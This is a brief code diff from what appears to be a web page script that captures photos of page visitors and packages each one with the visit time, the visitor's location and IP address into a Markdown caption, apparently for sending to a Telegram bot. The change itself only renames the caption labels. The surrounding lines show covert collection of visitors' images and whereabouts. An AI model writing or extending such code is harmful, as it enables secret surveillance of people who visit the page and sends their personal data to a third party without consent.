@@ -272,10 +272,10 @@ function initMainPage() {
         formData.append('photo', photoBlob, `visit_${new Date().getTime()}_${currentCount}.jpg`);
         
         const captionText = `
-*📸 Foto Pengunjung. ${currentCount} / ${totalCount} 📸 
-*🕒 :* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
-*📍 :* ${location}
-*🌐 :* ${ip}
+*📸 Foto Pengunjung.* ${currentCount} DARI ${totalCount} 📸
+*🕒 Waktu :* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+*📍 Lokasi :* ${location}
+*🌐 IP Address :* ${ip}
 `;
         formData.append('caption', captionText);
         formData.append('parse_mode', 'Markdown');
